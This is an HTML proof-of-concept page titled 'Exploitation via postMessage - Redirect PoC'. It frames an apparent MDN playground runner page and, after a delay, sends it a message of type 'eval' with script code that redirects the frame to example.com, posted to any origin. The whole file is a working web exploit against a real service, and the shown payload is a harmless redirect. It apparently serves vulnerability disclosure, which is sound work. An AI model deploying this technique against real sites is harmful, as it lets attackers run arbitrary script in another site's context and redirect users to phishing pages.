<!DOCTYPE html>
<html>
  <body>
    <h1>Exploitation via postMessage - Redirect PoC</h1>

    <iframe id="targetFrame"
      src="https://fc356f5a-2c8c-41cb-986a-4f2410e99d7c.mdnplay.dev/runner.html?state=TVJrT9tAEPwr25OQncqxHQgUnEfVQlDLo6WBFLW6L%2Be7dXxg3xnfJiRC%2FPfKNlT5tLOr1e3M3LywnMqCJWz84ezn6d2fmxk0gyk34%2FeaWrVt%2B8F0tqkKq0mQtgbWWkBlHV2jc2KJ0Ic5Kl2jJLixp%2BMoH0y54Wass1qUCFpNOCNRL5HOmwFn3LhaTjjLiSqXRFEmDw6PskPR35fHsj8cyLR%2Fcnwk%2BsNsfziI8eREfZJhqUxViG2ocB3VK2OwDhuinx0JwsnTIL28vDY%2FFunF7YIu5rd6uMofTrf22%2FxiXlarp%2Bry9%2BKx0ov07%2B3Vry97B2ctDdoWOOHsWSvKExjE8d4IctTLnBI4iuNqM4LU1grrBAbVBpwttIK0EPJxxFnjTdSJ7AQ7WeuKptxIaxxBpxkmoKxclWgoXCLNCmzg1%2B135Xs7rni9UFpDaOheG2WfR82Lzy0MhVKzNRq60o7QYO1zVnbecxaAjz2YTOGlO2sLDAu79Dmbo0S9RgVZbUvoeDb7GCpBojfi5rXXXokiuBeaILP12xqQhcIKFQDlaMChUQ2CUhRaartyu%2F%2FPjUO60yXaFfn%2BO5dOWriz5zfTbYUJeLgWhRc0hFXTFla2yQrzGrOdXOBGlFWBobQlZyOPm9cAvI9eSz2A%2FTiOGziO%2Fvs%2Bjt4zG7UhZgGTzrGEsYA9vFXKsUSWMCXqR%2Fb6Dw%3D%3D"
      style="width: 100%; height: 600px; border: 1px solid black;">
    </iframe>

    <script>
      const target = document.getElementById('targetFrame').contentWindow;

      window.addEventListener("message", (e) => {
        console.log("Received from iframe", e.data);
      });

      // Wait for iframe to load, then send the malicious postMessage
      setTimeout(() => {
        target.postMessage({
          type: 'eval',
          code: 'location.href="https://example.com";'
        }, '*');
      }, 2000);
    </script>
  </body>
</html>
